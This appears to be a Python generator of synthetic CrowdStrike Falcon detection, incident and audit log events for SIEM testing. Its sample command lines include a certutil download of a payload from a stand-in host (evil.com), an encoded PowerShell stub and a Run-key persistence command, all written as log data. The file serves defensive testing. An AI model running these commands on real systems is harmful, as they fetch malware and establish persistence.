"""CrowdStrike Falcon log generator — detection, incident, and audit events.

Matches the CrowdStrike Falcon Data Replicator (FDR) and SIEM connector
JSON output format. Covers DetectionSummaryEvent, IncidentSummaryEvent,
AuthActivityAuditEvent, UserActivityAuditEvent.
"""

from __future__ import annotations
import random
from datetime import datetime, timezone, timedelta
from typing import Any
from generators import generate_ip, generate_hostname, generate_uuid

_CIDS = ["a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4", "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5"]
_HOSTNAMES = ["DESKTOP-HQ01", "LAPTOP-SALES02", "SRV-DC-01", "SRV-WEB-02", "LAPTOP-ENG03",
              "DESKTOP-FIN04", "SRV-DB-01", "WORKSTATION-IT05"]
_OS = ["Windows 10", "Windows 11", "Windows Server 2022", "Windows Server 2019",
       "macOS Ventura 13.6", "Ubuntu 22.04", "RHEL 9.3"]
_USERS = ["jsmith", "agarcia", "mwilson", "lchen", "admin", "svc-monitor"]
_DOMAINS = ["CORP", "BRANCH", "CLOUD"]
_TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation",
            "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
            "Collection", "Command and Control", "Exfiltration", "Impact"]
_TECHNIQUES = [
    ("T1566", "Phishing"), ("T1059", "Command and Scripting Interpreter"),
    ("T1547", "Boot or Logon Autostart Execution"), ("T1055", "Process Injection"),
    ("T1003", "OS Credential Dumping"), ("T1021", "Remote Services"),
    ("T1071", "Application Layer Protocol"), ("T1486", "Data Encrypted for Impact"),
    ("T1078", "Valid Accounts"), ("T1105", "Ingress Tool Transfer"),
    ("T1543", "Create or Modify System Process"), ("T1218", "System Binary Proxy Execution"),
]
_DETECT_NAMES = [
    "Suspicious PowerShell Execution", "Credential Dumping via LSASS", "Cobalt Strike Beacon Detected",
    "Lateral Movement via PsExec", "Ransomware Behavior Detected", "Malicious Macro Execution",
    "Suspicious DLL Side-Loading", "Process Injection Detected", "Reverse Shell Activity",
    "Kerberoasting Attempt", "DCSync Attack Detected", "Living Off The Land Binary Usage",
    "Suspicious Registry Modification", "Unauthorized Remote Access Tool",
]
_SEVERITIES_NUM = [1, 2, 3, 4, 5]
_SEVERITY_NAMES = {1: "Informational", 2: "Low", 3: "Medium", 4: "High", 5: "Critical"}

def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds") + "Z"

def _detection(ctx=None) -> dict[str, Any]:
    pu = ctx.pick_user() if ctx else None
    pm = ctx.pick_machine() if ctx else None
    pc2 = ctx.pick_c2() if ctx else None
    pmal = ctx.pick_malware() if ctx else None
    hostname = pm.get("primary_workstation", random.choice(_HOSTNAMES)) if pm else random.choice(_HOSTNAMES)
    user = pu.get("username", random.choice(_USERS)) if pu else random.choice(_USERS)
    sev = random.choices(_SEVERITIES_NUM, weights=[10, 15, 35, 25, 15])[0]
    tactic = random.choice(_TACTICS)
    tech_id, tech_name = random.choice(_TECHNIQUES)
    detect_name = random.choice(_DETECT_NAMES)
    cmdline = pmal.get("cmdline", f"powershell.exe -enc {generate_uuid().replace('-','')[:24]}") if pmal else random.choice([
        "powershell.exe -enc UwB0AGEAcgB0AC0A", "cmd.exe /c whoami /all",
        "rundll32.exe shell32.dll,ShellExec_RunDLL", "certutil.exe -urlcache -f http://evil.com/payload.exe",
        "wmic process call create calc.exe", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ])
    return {
        "metadata": {"eventType": "DetectionSummaryEvent", "customerIDString": random.choice(_CIDS),
                      "offset": random.randint(100000, 9999999), "version": "1.0"},
        "event": {
            "DetectId": generate_uuid(), "DetectName": detect_name,
            "DetectDescription": f"{detect_name} — {tech_name}",
            "Severity": sev, "SeverityName": _SEVERITY_NAMES[sev],
            "Confidence": random.randint(60, 100),
            "ComputerName": hostname, "UserName": user,
            "MachineDomain": random.choice(_DOMAINS),
            "LocalIP": pm.get("ip") if pm else generate_ip(),
            "ExternalIP": generate_ip(),
            "MACAddress": ":".join(f"{random.randint(0,255):02x}" for _ in range(6)),
            "AgentIdString": generate_uuid(), "SensorId": generate_uuid(),
            "FalconHostLink": f"https://falcon.crowdstrike.com/activity/detections/detail/{generate_uuid()}",
            "Tactic": tactic, "Technique": f"{tech_id} - {tech_name}",
            "CommandLine": cmdline,
            "FileName": pmal.get("filename", cmdline.split()[0].split("\\")[-1]) if pmal else cmdline.split()[0].split("\\")[-1],
            "FilePath": random.choice(["\\Device\\HarddiskVolume3\\Windows\\System32\\",
                                        "\\Device\\HarddiskVolume3\\Users\\Public\\",
                                        "\\Device\\HarddiskVolume3\\ProgramData\\"]),
            "SHA256String": pmal.get("hash", generate_uuid().replace("-","") + generate_uuid().replace("-","")[:32]) if pmal else generate_uuid().replace("-","") + generate_uuid().replace("-","")[:32],
            "ParentImageFileName": random.choice(["\\explorer.exe", "\\cmd.exe", "\\powershell.exe", "\\svchost.exe", "\\wmiprvse.exe"]),
            "PatternDispositionFlags": {"Indicator": True, "Detect": True, "ProcessBlocked": sev >= 4,
                                        "Quarantined": sev >= 4, "KillProcess": sev == 5},
            "Objective": random.choice(["Falcon Detection Method", "Falcon Machine Learning"]),
            "ProcessStartTime": _now(), "timestamp": _now(),
        },
        "type": "DetectionSummaryEvent", "severity": _SEVERITY_NAMES[sev],
        "vendor": "CrowdStrike", "product": "Falcon",
    }

def _incident(ctx=None) -> dict[str, Any]:
    sev = random.choices(_SEVERITIES_NUM, weights=[5, 10, 30, 35, 20])[0]
    return {
        "metadata": {"eventType": "IncidentSummaryEvent", "customerIDString": random.choice(_CIDS)},
        "event": {
            "IncidentId": f"inc:{generate_uuid()}", "IncidentType": random.randint(1, 5),
            "State": random.choice(["open", "in_progress", "closed", "reopened"]),
            "FineScore": random.randint(1, 100),
            "LateralMovement": random.randint(0, 50),
            "HostCount": random.randint(1, 10),
            "Tags": [random.choice(_TACTICS) for _ in range(random.randint(1, 3))],
            "Users": [random.choice(_USERS) for _ in range(random.randint(1, 3))],
            "Hosts": [random.choice(_HOSTNAMES) for _ in range(random.randint(1, 3))],
            "start": _now(), "end": _now(), "timestamp": _now(),
        },
        "type": "IncidentSummaryEvent", "severity": _SEVERITY_NAMES[sev],
        "vendor": "CrowdStrike", "product": "Falcon",
    }

def _audit(ctx=None) -> dict[str, Any]:
    user = random.choice(_USERS)
    ops = [("createUser", "Created new user"), ("deleteUser", "Deleted user account"),
           ("updatePolicy", "Updated prevention policy"), ("enableRTR", "Enabled Real Time Response"),
           ("quarantineHost", "Quarantined host"), ("liftContainment", "Lifted containment on host"),
           ("revealToken", "API key accessed")]
    op, desc = random.choice(ops)
    return {
        "metadata": {"eventType": "AuthActivityAuditEvent", "customerIDString": random.choice(_CIDS)},
        "event": {
            "UserId": user, "UserIp": generate_ip(),
            "OperationName": op, "ServiceName": "CrowdStrike Falcon",
            "Success": random.random() < 0.9, "AuditKeyValues": [{"Key": "action", "ValueString": desc}],
            "timestamp": _now(),
        },
        "type": "AuthActivityAuditEvent", "severity": "Informational",
        "vendor": "CrowdStrike", "product": "Falcon",
    }

_GENERATORS = [(_detection, 55), (_incident, 15), (_audit, 30)]
_GEN_FUNCS = [g for g, _ in _GENERATORS]
_GEN_WEIGHTS = [w for _, w in _GENERATORS]

def generate_event(ctx=None) -> dict[str, Any]:
    gen = random.choices(_GEN_FUNCS, weights=_GEN_WEIGHTS, k=1)[0]
    return gen(ctx=ctx)
